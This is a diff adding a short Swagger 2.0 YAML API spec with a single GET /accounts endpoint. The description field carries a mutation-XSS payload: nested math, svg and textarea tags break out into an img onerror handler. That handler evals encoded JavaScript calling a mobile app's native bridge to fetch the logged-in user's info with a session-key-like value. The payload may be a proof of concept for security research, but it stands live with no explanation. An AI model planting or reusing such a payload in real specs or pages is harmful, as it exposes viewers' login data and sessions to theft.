@@ -1,0 +1,15 @@
+swagger: '2.0'
+info:
+  title: Example yaml.spec
+  description: |
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src=1 onerror=eval(decodeURI('UWNC.callH5=function(e)%7Balert(JSON.stringify(e))%7D;UWNC.callAndroid(JSON.stringify(%7B%22ncmd%22:%22GetLoginUserInfo%22,%22nparams%22:%7B%22sk%22:%22695e59ad799de443b755746219685a3f%22,%22sourceData%22:%7B%7D%7D,%22callbackWcmd%22:%22xxxxxx%22%7D))'))>">
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
